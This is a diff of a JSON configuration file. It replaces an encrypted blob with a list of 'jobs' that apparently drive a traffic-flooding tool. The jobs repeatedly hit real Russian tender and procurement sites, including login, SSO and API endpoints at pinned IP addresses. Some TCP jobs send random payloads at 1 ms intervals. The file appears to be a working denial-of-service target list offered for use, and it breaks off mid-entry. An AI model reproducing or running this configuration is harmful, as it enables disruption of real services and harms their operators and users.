-                "data": "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"
-            }
+  "jobs": [{
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://www.b2b-center.ru/market/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "79.171.117.82:80",
+            "is_tls": "false"
+          }
         }
-    ]
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://www.b2b-center.ru/market/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "79.171.117.82:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://www.fabrikant.ru/services"
+        },
+        "client": {
+          "static_host": {
+            "addr": "178.248.234.36:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://www.fabrikant.ru/services"
+        },
+        "client": {
+          "static_host": {
+            "addr": "178.248.234.36:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://astgoz.ru/page/index"
+        },
+        "client": {
+          "static_host": {
+            "addr": "213.171.56.148:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://astgoz.ru/page/index"
+        },
+        "client": {
+          "static_host": {
+            "addr": "213.171.56.148:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://otc.ru/tenders/companies/search"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.84.184.2:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://otc.ru/tenders/companies/search"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.84.184.2:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://tender.otc.ru/main/sso/Login.aspx?ReturnUrl=%2fmain%2fsso"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.84.184.5:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://tender.otc.ru/main/sso/Login.aspx?ReturnUrl=%2fmain%2fsso"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.84.184.5:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://api.new-market.otc.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.84.184.5:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://api.new-market.otc.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.84.184.5:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://market.otc.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.84.184.6:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://market.otc.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.84.184.6:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://api.market.otc.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.84.184.6:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://api.market.otc.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.84.184.6:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://stable-dnn.otc.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "83.69.207.146:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://stable-dnn.otc.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "83.69.207.146:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://api.market-stable.otc.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "83.69.207.146:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://api.market-stable.otc.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "83.69.207.146:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://crm.otc.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.84.184.11:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://crm.otc.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.84.184.11:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://ca.otc.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "176.212.125.107:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://ca.otc.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "176.212.125.107:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://ca.otc.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "176.212.125.107:8080",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://www.rts-tender.ru/poisk"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.179.85.62:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://www.rts-tender.ru/poisk"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.179.85.62:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://www.rosatom.rts-tender.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "79.171.117.80:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://www.rosatom.rts-tender.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "79.171.117.80:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://api.rts-tender.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.179.85.65:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://api.rts-tender.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.179.85.65:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://app.rts-tender.ru/auth/sso/login/participant?ReturnUrl=https%3a%2f%2fapp.rts-tender.ru%2fsupplier%2flk%2f&sso=1&code=-5"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.179.85.65:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://app.rts-tender.ru/auth/sso/login/participant?ReturnUrl=https%3a%2f%2fapp.rts-tender.ru%2fsupplier%2flk%2f&sso=1&code=-5"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.179.85.65:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://223.rts-tender.ru/supplier/sso/Login.aspx?ReturnUrl=%2fsupplier%2fsso%2f&sso=1&code=-5"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.179.85.58:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://223.rts-tender.ru/supplier/sso/Login.aspx?ReturnUrl=%2fsupplier%2fsso%2f&sso=1&code=-5"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.179.85.58:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "tcp",
+      "count": 15,
+      "args": {
+        "address": "185.179.85.96:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://it2-auth.rts-tender.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.179.85.96:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "tcp",
+      "count": 15,
+      "args": {
